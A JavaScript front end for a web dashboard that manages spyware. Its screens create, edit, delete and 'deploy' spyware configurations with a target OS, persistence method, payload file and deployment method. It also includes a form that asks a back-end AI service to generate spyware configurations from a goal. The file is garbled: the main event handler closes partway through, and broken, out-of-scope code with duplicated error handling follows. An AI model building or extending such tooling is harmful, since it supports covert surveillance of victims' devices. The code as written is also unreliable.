document.addEventListener('DOMContentLoaded', () => {
    const appDiv = document.getElementById('app');
    let currentSpywareId = null;
    let currentPayloadId = null;
    let currentDeploymentMethodId = null;

    // --- Helper Functions ---
    const showLoading = (message = 'Loading...') => {
        appDiv.innerHTML = `<p>${message}</p>`;
    };

    const showError = (message) => {
        appDiv.innerHTML = `<p style="color:red;">Error: ${message}</p>`;
    };

    // --- Spyware Management ---
    const fetchSpyware = async () => {
        showLoading('Fetching spyware configurations...');
        try {
            const response = await fetch('/spyware');
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const data = await response.json();
            displaySpyware(data);
        } catch (error) {
            showError(`Error fetching spyware: ${error}`);
        }
    };

    const displaySpyware = (spywareList) => {
        let html = '<h2>Spyware Configurations</h2>';
        if (spywareList.length === 0) {
            html += '<p>No spyware configurations found.</p>';
        } else {
            html += '<table><thead><tr><th>Name</th><th>Description</th><th>Actions</th></tr></thead><tbody>';
            spywareList.forEach(spyware => {
                html += `<tr>
                            <td>${spyware.name}</td>
                            <td>${spyware.description}</td>
                            <td>
                                <button onclick="deploySpyware(${spyware.id})">Deploy</button>
                                <button onclick="editSpyware(${spyware.id})">Edit</button>
                                <button onclick="deleteSpyware(${spyware.id})">Delete</button>
                            </td>
                        </tr>`;
            });
            html += '</tbody></table>';
        }
        html += '<button onclick="showCreateSpywareForm()">Create New Spyware</button>';
        html += '<button onclick="showPayloadManagement()">Manage Payloads</button>';
        html += '<button onclick="showDeploymentMethodManagement()">Manage Deployment Methods</button>';
        appDiv.innerHTML = html;
    };

    window.deploySpyware = async (spywareId) => {
        showLoading(`Deploying spyware with ID ${spywareId}...`);
        try {
            const response = await fetch(`/spyware/${spywareId}/deploy`, { method: 'POST' });
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            alert(`Spyware with ID ${spywareId} deployed successfully!`);
            fetchSpyware();
        } catch (error) {
            showError(`Error deploying spyware: ${error}`);
        }
    };

    window.showCreateSpywareForm = () => {
        currentSpywareId = null;
        appDiv.innerHTML = getSpywareForm();
        fetchPayloadsAndDeploymentMethods();
    };

    window.editSpyware = async (spywareId) => {
        currentSpywareId = spywareId;
        showLoading(`Fetching spyware with ID ${spywareId} for edit...`);
        try {
            const response = await fetch(`/spyware/${spywareId}`);
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const spyware = await response.json();
            appDiv.innerHTML = getSpywareForm(spyware);
            fetchPayloadsAndDeploymentMethods();
        } catch (error) {
            showError(`Error fetching spyware for edit: ${error}`);
        }
    };

    window.deleteSpyware = async (spywareId) => {
        if (confirm(`Are you sure you want to delete spyware with ID ${spywareId}?`)) {
            showLoading(`Deleting spyware with ID ${spywareId}...`);
            try {
                const response = await fetch(`/spyware/${spywareId}`, { method: 'DELETE' });
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                alert(`Spyware with ID ${spywareId} deleted successfully!`);
                fetchSpyware();
            } catch (error) {
                showError(`Error deleting spyware: ${error}`);
            }
        }
    };

    const fetchPayloadsAndDeploymentMethods = async () => {
        try {
            const [payloadResponse, deploymentResponse] = await Promise.all([
                fetch('/payloads'),
                fetch('/deployment_methods')
            ]);
            if (!payloadResponse.ok || !deploymentResponse.ok) {
                throw new Error('Error fetching payloads or deployment methods');
            }
            const payloads = await payloadResponse.json();
            const deploymentMethods = await deploymentResponse.json();
            populateDropdowns(payloads, deploymentMethods);
        } catch (error) {
            showError(`Error fetching payloads or deployment methods: ${error}`);
        }
    };

    const populateDropdowns = (payloads, deploymentMethods) => {
        const payloadSelect = document.getElementById('payload_id');
        const deploymentSelect = document.getElementById('deployment_method_id');

        payloadSelect.innerHTML = '<option value="">Select Payload</option>';
        deploymentSelect.innerHTML = '<option value="">Select Deployment Method</option>';

        payloads.forEach(payload => {
            const option = document.createElement('option');
            option.value = payload.id;
            option.textContent = payload.name;
            payloadSelect.appendChild(option);
        });

        deploymentMethods.forEach(method => {
            const option = document.createElement('option');
            option.value = method.id;
            option.textContent = method.name;
            deploymentSelect.appendChild(option);
        });
    };

    const getSpywareForm = (spyware = null) => {
        const isEdit = spyware !== null;
        const title = isEdit ? 'Edit Spyware' : 'Create New Spyware';
        const submitText = isEdit ? 'Update Spyware' : 'Create Spyware';
        const nameValue = isEdit ? spyware.name : '';
        const descriptionValue = isEdit ? spyware.description : '';
        const targetOsValue = isEdit ? spyware.target_os : '';
        const persistenceMethodValue = isEdit ? spyware.persistence_method : '';
        const payloadIdValue = isEdit ? spyware.payload_id : '';
        const deploymentMethodIdValue = isEdit ? spyware.deployment_method_id : '';
        const configValue = isEdit ? JSON.stringify(spyware.config) : '';

        return `
            <div>
                <h2>${title}</h2>
                <form id="spywareForm">
                    <label for="name">Name:</label>
                    <input type="text" id="name" value="${nameValue}" required><br>

                    <label for="description">Description:</label>
                    <textarea id="description" required>${descriptionValue}</textarea><br>

                    <label for="target_os">Target OS:</label>
                    <input type="text" id="target_os" value="${targetOsValue}" required><br>

                    <label for="persistence_method">Persistence Method:</label>
                    <input type="text" id="persistence_method" value="${persistenceMethodValue}" required><br>

                    <label for="payload_id">Payload:</label>
                    <select id="payload_id" required>
                        <option value="">Select Payload</option>
                    </select><br>

                    <label for="deployment_method_id">Deployment Method:</label>
                    <select id="deployment_method_id" required>
                        <option value="">Select Deployment Method</option>
                    </select><br>

                    <label for="config">Config (JSON):</label>
                    <textarea id="config">${configValue}</textarea><br>

                    <button type="submit">${submitText}</button>
                    <button type="button" onclick="fetchSpyware()">Cancel</button>
                </form>
                ${isEdit ? '' : '<button onclick="showAISpywareForm()">Create with AI</button>'}
            </div>
        `;
    };

    // --- Deployment Method Management ---
    window.showDeploymentMethodManagement = async () => {
        currentDeploymentMethodId = null;
        showLoading('Fetching deployment methods...');
        try {
            const response = await fetch('/deployment_methods');
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const data = await response.json();
            displayDeploymentMethods(data);
        } catch (error) {
            showError(`Error fetching deployment methods: ${error}`);
        }
    };

    const displayDeploymentMethods = (methodList) => {
        let html = '<h2>Deployment Method Management</h2>';
        if (methodList.length === 0) {
            html += '<p>No deployment methods found.</p>';
        } else {
            html += '<table><thead><tr><th>Name</th><th>Description</th><th>Actions</th></tr></thead><tbody>';
            methodList.forEach(method => {
                html += `<tr>
                            <td>${method.name}</td>
                            <td>${method.description}</td>
                            <td>
                                <button onclick="editDeploymentMethod(${method.id})">Edit</button>
                                <button onclick="deleteDeploymentMethod(${method.id})">Delete</button>
                            </td>
                        </tr>`;
            });
            html += '</tbody></table>';
        }
        html += '<button onclick="showCreateDeploymentMethodForm()">Create New Deployment Method</button>';
        html += '<button onclick="fetchSpyware()">Back to Spyware</button>';
        appDiv.innerHTML = html;
    };

    window.showCreateDeploymentMethodForm = () => {
        currentDeploymentMethodId = null;
        appDiv.innerHTML = getDeploymentMethodForm();
    };

    window.editDeploymentMethod = async (methodId) => {
        currentDeploymentMethodId = methodId;
        showLoading(`Fetching deployment method with ID ${methodId} for edit...`);
        try {
            const response = await fetch(`/deployment_methods/${methodId}`);
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const method = await response.json();
            appDiv.innerHTML = getDeploymentMethodForm(method);
        } catch (error) {
            showError(`Error fetching deployment method for edit: ${error}`);
        }
    };

    window.deleteDeploymentMethod = async (methodId) => {
        if (confirm(`Are you sure you want to delete deployment method with ID ${methodId}?`)) {
            showLoading(`Deleting deployment method with ID ${methodId}...`);
            try {
                const response = await fetch(`/deployment_methods/${methodId}`, { method: 'DELETE' });
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                alert(`Deployment method with ID ${methodId} deleted successfully!`);
                showDeploymentMethodManagement();
            } catch (error) {
                showError(`Error deleting deployment method: ${error}`);
            }
        }
    };

    const getDeploymentMethodForm = (method = null) => {
        const isEdit = method !== null;
        const title = isEdit ? 'Edit Deployment Method' : 'Create New Deployment Method';
        const submitText = isEdit ? 'Update Deployment Method' : 'Create Deployment Method';
        const nameValue = isEdit ? method.name : '';
        const descriptionValue = isEdit ? method.description : '';
        const configSchemaValue = isEdit ? JSON.stringify(method.config_schema) : '';

        return `
            <div>
                <h2>${title}</h2>
                <form id="deploymentMethodForm">
                    <label for="name">Name:</label>
                    <input type="text" id="name" value="${nameValue}" required><br>
            
                    <label for="description">Description:</label>
                    <textarea id="description" required>${descriptionValue}</textarea><br>
            
                    <label for="config_schema">Config Schema (JSON):</label>
                    <textarea id="config_schema">${configSchemaValue}</textarea><br>
            
                    <button type="submit">${submitText}</button>
                    <button type="button" onclick="showDeploymentMethodManagement()">Cancel</button>
                </form>
            </div>
        `;
    };

    fetchSpyware(); // Initial fetch of spyware configurations

    appDiv.addEventListener('submit', async (event) => {
        event.preventDefault();
        if (event.target.id === 'spywareForm') {
            const form = document.getElementById('spywareForm');
            const formData = {
                name: form.name.value,
                description: form.description.value,
                target_os: form.target_os.value,
                persistence_method: form.persistence_method.value,
                payload_id: parseInt(form.payload_id.value),
                deployment_method_id: parseInt(form.deployment_method_id.value),
                config: form.config.value ? JSON.parse(form.config.value) : {}
            };

            try {
                const url = currentSpywareId ? `/spyware/${currentSpywareId}` : '/spyware';
                const method = currentSpywareId ? 'PUT' : 'POST';
                const response = await fetch(url, {
                    method: method,
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formData)
                });
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
            } catch (error) {
                showError(`Error ${currentSpywareId ? 'updating' : 'creating'} spyware: ${error}`);
            }
        }
    });
});            alert(`Spyware ${currentSpywareId ? 'updated' : 'created'} successfully!`);
            fetchSpyware();
        } catch (error) {
            showError(`Error ${currentSpywareId ? 'updating' : 'creating'} spyware: ${error}`);
        }
    }
     if (event.target.id === 'aiSpywareForm') {
        const form = document.getElementById('aiSpywareForm');
        const formData = {
            goal: form.ai_goal.value,
            constraints: form.ai_constraints.value ? JSON.parse(form.ai_constraints.value) : {}
        };

        try {
            const response = await fetch('/ai/generate_spyware', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(formData)
            });
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const aiConfig = await response.json();
            appDiv.innerHTML = getSpywareForm(aiConfig);
            fetchPayloadsAndDeploymentMethods();
        } catch (error) {
            showError(`Error generating spyware config with AI: ${error}`);
        }
    }
    if (event.target.id === 'payloadForm') {
        const form = document.getElementById('payloadForm');
        const formData = {
            name: form.name.value,
            description: form.description.value,
            file_path: form.file_path.value
        };

        try {
            const url = currentPayloadId ? `/payloads/${currentPayloadId}` : '/payloads';
            const method = currentPayloadId ? 'PUT' : 'POST';
            const response = await fetch(url, {
                method: method,
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(formData)
            });
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            alert(`Payload ${currentPayloadId ? 'updated' : 'created'} successfully!`);
            showPayloadManagement();
        } catch (error) {
            showError(`Error ${currentPayloadId ? 'updating' : 'creating'} payload: ${error}`);
        }
    }
    if (event.target.id === 'deploymentMethodForm') {
        const form = document.getElementById('deploymentMethodForm');
        const formData = {
            name: form.name.value,
            description: form.description.value,
            config_schema: form.config_schema.value ? JSON.parse(form.config_schema.value) : {}
        };

        try {
            const url = currentDeploymentMethodId ? `/deployment_methods/${currentDeploymentMethodId}` : '/deployment_methods';
            const method = currentDeploymentMethodId ? 'PUT' : 'POST';
            const response = await fetch(url, {
                method: method,
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(formData)
            });
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            alert(`Deployment method ${currentDeploymentMethodId ? 'updated' : 'created'} successfully!`);
            showDeploymentMethodManagement();
        } catch (error) {
            showError(`Error ${currentDeploymentMethodId ? 'updating' : 'creating'} deployment method: ${error}`);
        }
    }
});

window.showAISpywareForm = () => {
    appDiv.innerHTML = getAISpywareForm();
};

const getAISpywareForm = () => {
    return `
        <h2>Create Spyware with AI</h2>
        <form id="aiSpywareForm">
            <label for="ai_goal">Goal:</label>
            <input type="text" id="ai_goal" required><br />

            <label for="ai_constraints">Constraints (JSON):</label>
            <textarea id="ai_constraints"></textarea><br />

            <button type="submit">Generate Spyware Config</button>
            <button type="button" onclick="showCreateSpywareForm()">Cancel</button>
        </form>
    `;
};

// --- Payload Management ---
window.showPayloadManagement = async () => {
    currentPayloadId = null;
    showLoading('Fetching payloads...');
    try {
        const response = await fetch('/payloads');
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const data = await response.json();
        displayPayloads(data);
    } catch (error) {
        showError(`Error fetching payloads: ${error}`);
    }
};

const displayPayloads = (payloadList) => {
    let html = '<h2>Payload Management</h2>';
    if (payloadList.length === 0) {
        html += '<p>No payloads found.</p>';
    } else {
        html += '<table><thead><tr><th>Name</th><th>Description</th><th>Actions</th></tr></thead><tbody>';
        payloadList.forEach(payload => {
            html += `<tr>
                        <td>${payload.name}</td>
                        <td>${payload.description}</td>
                        <td>
                            <button onclick="editPayload(${payload.id})">Edit</button>
                            <button onclick="deletePayload(${payload.id})">Delete</button>
                        </td>
                    </tr>`;
        });
        html += '</tbody></table>';
    }
    html += '<button onclick="showCreatePayloadForm()">Create New Payload</button>';
    html += '<button onclick="fetchSpyware()">Back to Spyware</button>';
    appDiv.innerHTML = html;
};

window.showCreatePayloadForm = () => {
    currentPayloadId = null;
    appDiv.innerHTML = getPayloadForm();
};

window.editPayload = async (payloadId) => {
    currentPayloadId = payloadId;
    showLoading(`Fetching payload with ID ${payloadId} for edit...`);
    try {
        const response = await fetch(`/payloads/${payloadId}`);
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const payload = await response.json();
        appDiv.innerHTML = getPayloadForm(payload);
    } catch (error) {
        showError(`Error fetching payload for edit: ${error}`);
    }
};

window.deletePayload = async (payloadId) => {
    if (confirm(`Are you sure you want to delete payload with ID ${payloadId}?`)) {
        showLoading(`Deleting payload with ID ${payloadId}...`);
        try {
            const response = await fetch(`/payloads/${payloadId}`, { method: 'DELETE' });
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            alert(`Payload with ID ${payloadId} deleted successfully!`);
            showPayloadManagement();
        } catch (error) {
            showError(`Error deleting payload: ${error}`);
        }
    }
};

const getPayloadForm = (payload = null) => {
    const isEdit = payload !== null;
    const title = isEdit ? 'Edit Payload' : 'Create New Payload';
    const submitText = isEdit ? 'Update Payload' : 'Create Payload';
    const nameValue = isEdit ? payload.name : '';
    const descriptionValue = isEdit ? payload.description : '';
    const filePathValue = isEdit ? payload.file_path : '';

    return `
        <div>
            <h2>${title}</h2>
            <form id="payloadForm">
                <label for="name">Name:</label>
                <input type="text" id="name" value="${nameValue}" required><br>

                <label for="description">Description:</label>
                <textarea id="description" required>${descriptionValue}</textarea><br>

                <label for="file_path">File Path:</label>
                <input type="text" id="file_path" value="${filePathValue}" required><br>

                <button type="submit">${submitText}</button>
                <button type="button" onclick="showPayloadManagement()">Cancel</button>
            </form>
        </div>
    `;
};
